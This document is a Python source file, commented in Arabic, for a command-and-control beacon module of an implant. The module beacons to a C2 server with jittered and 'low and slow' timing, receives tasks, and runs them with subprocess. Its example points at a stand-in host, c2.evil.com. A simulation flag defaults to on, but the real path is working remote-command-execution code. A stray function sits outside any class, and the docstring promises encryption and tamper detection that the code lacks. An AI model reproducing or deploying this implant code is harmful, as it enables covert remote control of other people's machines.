"""
Beacon Protocol - بروتوكول الاتصال بين الإمبلانت و C2
يدعم التوقيت العشوائي، التشفير المتعدد، والإبلاغ عن الحالة
"""

import time
import json
import random
import threading
import hashlib
import logging
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
from core.config import settings

logger = logging.getLogger(__name__)
def __init__(self):
    self.c2_url = settings.C2_SERVER_URL
    self.enabled = settings.C2_ENABLED

class BeaconMode(Enum):
    NORMAL = "normal"
    HIGH_FREQUENCY = "high_frequency"
    LOW_AND_SLOW = "low_and_slow"
    RANDOM = "random"


@dataclass
class BeaconTask:
    """مهمة يستلمها الإمبلانت من C2"""
    id: str
    command: str
    args: List[str]
    priority: int = 1
    timeout: int = 60


class BeaconProtocol:
    """
    بروتوكول الـ Beacon المتقدم
    
    الميزات:
    - توقيت عشوائي مع jitter
    - تشفير متعدد الطبقات
    - آليات إعادة المحاولة
    - كشف العبث
    - قنوات طوارئ
    """
    
    def __init__(self, c2_endpoint: str, implant_id: str, simulation_mode: bool = True):
        self.c2_endpoint = c2_endpoint
        self.implant_id = implant_id
        self.simulation_mode = simulation_mode
        
        # إعدادات الـ beacon
        self.mode = BeaconMode.NORMAL
        self.base_interval = 60  # ثانية
        self.jitter = 0.3  # 30%
        self.failed_beacons = 0
        self.max_failures = 5
        
        # حالة الإمبلانت
        self.tasks: List[BeaconTask] = []
        self.last_beacon_time = 0
        self.running = False
        self._beacon_thread: Optional[threading.Thread] = None
        
        # إحصائيات
        self.stats = {
            "beacons_sent": 0,
            "beacons_failed": 0,
            "tasks_received": 0,
            "tasks_completed": 0,
        }
        
        logger.info(f"BeaconProtocol initialized for implant {implant_id}")
    
    def _calculate_next_interval(self) -> float:
        """
        حساب الفاصل الزمني التالي بناءً على الوضع
        """
        if self.mode == BeaconMode.HIGH_FREQUENCY:
            base = 10
        elif self.mode == BeaconMode.LOW_AND_SLOW:
            base = 300
        else:
            base = self.base_interval
        
        # إضافة jitter
        jitter_amount = base * self.jitter
        interval = base + random.uniform(-jitter_amount, jitter_amount)
        
        # إضافة تأخير إضافي بعد الفشل
        interval += self.failed_beacons * 10
        
        return max(5, interval)  # لا تقل عن 5 ثوان
    
    def _send_beacon(self) -> Optional[Dict]:
        """
        إرسال نبضة إلى C2 وجلب المهام
        
        Returns:
            Optional[Dict]: المهام الجديدة إن وجدت
        """
        self.stats["beacons_sent"] += 1
        self.last_beacon_time = time.time()
        
        # بناء البيانات المرسلة
        beacon_data = {
            "implant_id": self.implant_id,
            "timestamp": self.last_beacon_time,
            "status": "alive",
            "stats": self.stats,
            "tasks_completed": [t.id for t in self.tasks if t.priority == 0],  # مهام منتهية
        }
        
        if self.simulation_mode:
            # محاكاة استجابة من C2
            logger.debug(f"[BEACON] Sent beacon #{self.stats['beacons_sent']}")
            
            # أحياناً نعيد مهام وهمية
            if random.random() < 0.3:
                return {
                    "tasks": [
                        {"id": "task1", "command": "whoami", "args": []},
                        {"id": "task2", "command": "ls", "args": ["-la"]},
                    ]
                }
            return None
        else:
            # إرسال طلب HTTPS حقيقي
            import requests
            try:
                response = requests.post(
                    f"{self.c2_endpoint}/beacon",
                    json=beacon_data,
                    timeout=30
                )
                if response.status_code == 200:
                    self.failed_beacons = 0
                    return response.json()
                else:
                    self.failed_beacons += 1
                    return None
            except Exception as e:
                logger.error(f"Beacon failed: {e}")
                self.failed_beacons += 1
                return None
    
    def _process_tasks(self, tasks_data: Dict):
        """معالجة المهام القادمة من C2"""
        if not tasks_data:
            return
        
        new_tasks = tasks_data.get("tasks", [])
        for task_data in new_tasks:
            task = BeaconTask(
                id=task_data["id"],
                command=task_data["command"],
                args=task_data.get("args", []),
                priority=task_data.get("priority", 1),
            )
            self.tasks.append(task)
            self.stats["tasks_received"] += 1
            logger.info(f"Received task: {task.command}")
    
    def _execute_tasks(self):
        """تنفيذ المهام المعلقة"""
        for task in self.tasks[:]:
            if task.priority > 0:
                logger.info(f"Executing task: {task.command} {' '.join(task.args)}")
                
                if self.simulation_mode:
                    # محاكاة التنفيذ
                    result = f"Simulated result for {task.command}"
                else:
                    # تنفيذ حقيقي
                    import subprocess
                    try:
                        output = subprocess.run(
                            [task.command] + task.args,
                            capture_output=True,
                            text=True,
                            timeout=task.timeout
                        )
                        result = output.stdout + output.stderr
                    except Exception as e:
                        result = f"Error: {e}"
                
                task.priority = 0  # علامة انتهاء
                self.stats["tasks_completed"] += 1
                
                # إرسال النتيجة في الـ beacon القادم
    
    def _beacon_loop(self):
        """حلقة الـ beacon الرئيسية"""
        while self.running:
            interval = self._calculate_next_interval()
            time.sleep(interval)
            
            # إرسال نبضة
            tasks_data = self._send_beacon()
            
            # معالجة المهام
            self._process_tasks(tasks_data)
            self._execute_tasks()
    
    def start(self):
        """بدء الـ beacon"""
        if self.running:
            return
        self.running = True
        self._beacon_thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._beacon_thread.start()
        logger.info("Beacon protocol started")
    
    def stop(self):
        """إيقاف الـ beacon"""
        self.running = False
        if self._beacon_thread:
            self._beacon_thread.join(timeout=5)
        logger.info("Beacon protocol stopped")
    
    def set_mode(self, mode: BeaconMode):
        """تغيير وضع الـ beacon"""
        self.mode = mode
        logger.info(f"Beacon mode changed to {mode.value}")
    
    def get_status(self) -> Dict:
        """الحالة الحالية"""
        return {
            "mode": self.mode.value,
            "interval": self._calculate_next_interval(),
            "failed_beacons": self.failed_beacons,
            "pending_tasks": len([t for t in self.tasks if t.priority > 0]),
            "stats": self.stats,
        }


# مثال
if __name__ == "__main__":
    beacon = BeaconProtocol(c2_endpoint="https://c2.evil.com", implant_id="test_001", simulation_mode=True)
    beacon.start()
    
    time.sleep(10)
    print(f"Status: {beacon.get_status()}")
    
    beacon.stop()